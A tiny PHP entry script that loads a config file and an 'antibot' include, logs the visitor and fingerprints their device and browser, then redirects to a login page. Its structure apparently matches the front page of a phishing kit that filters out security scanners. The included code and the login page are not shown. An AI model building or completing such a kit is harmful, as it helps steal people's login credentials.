<?php
    session_start();
    include "./Assets/php/config/config.php";   
    include "./Assets/php/prevents/antibot.php";
    $visitors = Visitors();
    get_device_and_browser();
    header("Location: ./login.php");
    exit;
?>